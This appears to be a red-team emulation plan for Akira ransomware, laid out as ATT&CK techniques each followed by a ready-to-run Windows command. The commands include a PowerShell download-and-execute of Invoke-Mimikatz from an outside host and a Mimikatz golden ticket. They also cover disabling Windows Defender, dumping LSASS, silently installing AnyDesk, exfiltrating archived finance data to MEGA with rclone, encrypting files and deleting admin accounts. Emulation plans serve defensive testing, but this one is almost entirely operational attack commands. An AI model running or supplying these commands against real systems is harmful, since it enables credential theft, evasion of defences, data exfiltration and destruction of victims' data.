# Akira Ransomware Emulation Plan

## Initial Access (TA0001)

# T1133 - External Remote Services (VPN compromise)

# T1078 - Valid Accounts (RDP with stolen creds)
xfreerdp /v:10.0.0.100 /u:admin /p:'P@ssw0rd!' +drive:/tmp/share +clipboard /dynamic-resolution


## Execution (TA0002)

# T1059.001 - PowerShell (Credential harvesting)
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"


## Persistence (TA0003)

# T1219 - Remote Access Software (AnyDesk install)
curl -o AnyDeskSetup.exe https://download.anydesk.com/AnyDesk.exe && AnyDeskSetup.exe --install C:\ProgramData\AnyDesk --silent --start-with-win


## Privilege Escalation (TA0004)

# T1558 - Kerberos Ticket Theft (Mimikatz)
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789 /krbtgt:a1b2c3d4e5f6g7h8 /ptt" exit


## Defense Evasion (TA0005)

# T1562.001 - Disable Windows Defender
powershell -exec bypass -c "Set-MpPreference -DisableRealtimeMonitoring \$true; Set-MpPreference -DisableIOAVProtection \$true"

# T1036.005 - Masquerading (System32 mimic)
copy C:\malware\backdoor.exe C:\Windows\System32\svchost.exe /y


## Credential Access (TA0006)

# T1003.001 - LSASS Dumping (Procdump)
procdump.exe -accepteula -ma lsass.exe lsass.dmp


## Discovery (TA0007)

# T1482 - Domain Trust Discovery
nltest /domain_trusts /all_trusts

# T1018 - Remote System Discovery
for /l %i in (1,1,254) do @ping -n 1 -w 100 10.0.0.%i | find "Reply" 


## Lateral Movement (TA0008)

# T1021.001 - RDP Lateral Movement
cmdkey /generic:TERMSRV/10.0.1.100 /user:DOMAIN\Admin /pass:P@ssw0rd! && mstsc /v:10.0.1.100


## Collection (TA0009)

# T1213.002 - SharePoint Data Collection
powershell -c "(New-Object Net.WebClient).DownloadFile('https://sharepoint.corp.com/Shared%20Documents/secret.docx', 'C:\Temp\secret.docx')"


## Exfiltration (TA0010)

# T1560.001 - Archive with WinRAR
"C:\Program Files\WinRAR\Rar.exe" a -hpP@ssw0rd -r -m5 C:\exfil\finance.rar C:\Finance\*

# T1567.002 - Rclone Exfiltration
rclone copy C:\exfil\finance.rar mega:exfil/Akira_Operation -v --config=rclone.conf


## Impact (TA0040)

# T1486 - File Encryption (Akira ransomware)
akira.exe --encrypt --path C:\ --extensions ".doc,.pdf,.xls" --key RSA_PUBLIC_KEY

# T1531 - Account Deletion
net user Administrator /delete && net user BackupAdmin /delete
